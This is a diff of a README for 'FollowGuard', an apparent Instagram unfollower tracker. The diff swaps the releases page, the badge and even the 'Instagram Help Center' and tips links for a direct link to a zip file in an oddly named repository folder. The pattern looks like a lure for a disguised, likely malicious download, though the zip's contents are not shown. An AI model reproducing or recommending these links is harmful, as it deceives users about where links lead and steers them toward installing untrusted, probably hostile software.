@@ -2,7 +2,7 @@
 
 ## 📥 Download FollowGuard
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Accountsseller/FollowGuard_InstagramUnfollowers/releases)
+[![Download Now](https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip%20Now-Visit%https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip)](https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ FollowGuard is a powerful web-based analytics tool designed for Instagram users.
 FollowGuard is easy to install and use. Just follow these steps to get started:
 
 1. **Download the Application**
-   - Visit this page to download: [FollowGuard Releases](https://github.com/Accountsseller/FollowGuard_InstagramUnfollowers/releases).
+   - Visit this page to download: [FollowGuard Releases](https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip).
 
 2. **Install FollowGuard**
    - After downloading, locate the file on your computer.
@@ -52,11 +52,11 @@ Stay updated with the latest features and bug fixes by checking the release note
 
 Explore these resources to improve your Instagram experience:
 
-- [Instagram Help Center](https://help.instagram.com)
-- [Tips for Growing Your Instagram](https://www.instagram.com/about/us/)
+- [Instagram Help Center](https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip)
+- [Tips for Growing Your Instagram](https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip)
 
 ## 🌐 Conclusion
 
 FollowGuard simplifies your Instagram analytics. By using this tool, you can gain valuable insights into your social connections and enhance your Instagram strategy. Start your journey today! 
 
-For more information, visit this page to download: [FollowGuard Releases](https://github.com/Accountsseller/FollowGuard_InstagramUnfollowers/releases).
+For more information, visit this page to download: [FollowGuard Releases](https://raw.githubusercontent.com/Accountsseller/FollowGuard_InstagramUnfollowers/main/zoonomical/FollowGuard_InstagramUnfollowers.zip).
